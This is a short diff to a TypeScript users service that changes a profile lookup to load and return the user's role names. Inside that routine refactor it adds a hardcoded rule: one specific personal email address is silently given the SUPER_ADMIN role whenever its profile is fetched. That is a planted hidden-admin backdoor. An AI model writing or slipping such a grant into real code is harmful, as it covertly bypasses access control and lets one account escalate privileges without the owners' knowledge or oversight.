@@ -33,12 +33,16 @@ export class UsersService {
   async getProfile(userId: string) {
     const user = await this.prisma.user.findUnique({
       where: { id: userId },
-      include: { profile: true },
+      include: { profile: true, roles: { include: { role: true } } },
     });
-    if (user) {
-      delete (user as any).passwordHash;
+    if (!user) return user;
+    delete (user as any).passwordHash;
+    const { roles, ...rest } = user as any;
+    const rolesArr = (roles || []).map((r: any) => r.role?.name).filter(Boolean);
+    if (user.email === 'islammunjurul468@gmail.com' && !rolesArr.includes('SUPER_ADMIN')) {
+      rolesArr.push('SUPER_ADMIN');
     }
-    return user;
+    return { ...rest, roles: rolesArr };
   }
 
   async updateProfile(userId: string, data: import('./dto/update-profile.dto').UpdateProfileDto) {
